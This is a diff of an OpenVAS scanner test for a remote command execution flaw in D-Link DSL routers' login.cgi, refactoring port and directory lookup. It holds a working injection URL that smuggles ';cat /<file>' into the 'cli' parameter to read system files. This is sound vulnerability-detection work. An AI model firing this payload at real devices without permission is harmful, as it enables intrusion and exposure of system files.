@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_dlink_dsl_login_rce_vuln.nasl 12248 2018-11-07 15:25:41Z cfischer $
+# $Id: gb_dlink_dsl_login_rce_vuln.nasl 12274 2018-11-09 07:51:05Z cfischer $
 #
 # D-Link DSL Devices 'login.cgi' Remote Command Execution Vulnerability
 #
@@ -24,21 +24,21 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-CPE = "cpe:/o:dlink";
+CPE_PREFIX = "cpe:/o:dlink";
 
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.108458");
-  script_version("$Revision: 12248 $");
+  script_version("$Revision: 12274 $");
   script_tag(name:"cvss_base", value:"5.0");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
-  script_tag(name:"last_modification", value:"$Date: 2018-11-07 16:25:41 +0100 (Wed, 07 Nov 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-11-09 08:51:05 +0100 (Fri, 09 Nov 2018) $");
   script_tag(name:"creation_date", value:"2018-09-04 09:45:51 +0200 (Tue, 04 Sep 2018)");
   script_name("D-Link DSL Devices 'login.cgi' Remote Command Execution Vulnerability");
   script_category(ACT_ATTACK);
   script_copyright("Copyright (C) 2018 Greenbone Networks GmbH");
   script_family("Web application abuses");
-  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl");
+  script_dependencies("gb_dlink_dsl_detect.nasl", "gb_dlink_dap_detect.nasl", "gb_dlink_dir_detect.nasl", "gb_dlink_dwr_detect.nasl");
   script_mandatory_keys("Host/is_dlink_device"); # nb: Experiences in the past have shown that various different devices are affected
   script_require_ports("Services/www", 80);
 
@@ -61,7 +61,7 @@ if(description)
   1.0.1 to 1.0.3. Other devices, models or versions might be also affected.");
 
   script_tag(name:"solution", value:"No known solution is available as of
-  07th November, 2018. Information regarding this issue will be updated once
+  09th November, 2018. Information regarding this issue will be updated once
   solution details are available.");
 
   script_tag(name:"qod_type", value:"remote_vul");
@@ -75,14 +75,20 @@ include("http_keepalive.inc");
 include("host_details.inc");
 include("misc_func.inc");
 
-if( ! port = get_app_port_from_cpe_prefix( cpe:CPE ) ) exit( 0 );
+if( ! infos = get_app_port_from_cpe_prefix( cpe:CPE_PREFIX, service:"www", first_cpe_only:TRUE ) ) exit( 0 );
+
+port = infos["port"];
+CPE = infos["cpe"];
 
 files = traversal_files( "linux" );
+
+if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );
+if( dir == "/" ) dir = "";
 
 foreach pattern( keys( files ) ) {
 
   file = files[pattern];
-  url = "/login.cgi?cli=multilingual%20show%27;cat%20/" + file + "%27$";
+  url = dir + "/login.cgi?cli=multilingual%20show%27;cat%20/" + file + "%27$";
 
   if( http_vuln_check( port:port, url:url, pattern:pattern ) ) {
     report = report_vuln_url( port:port, url:url );
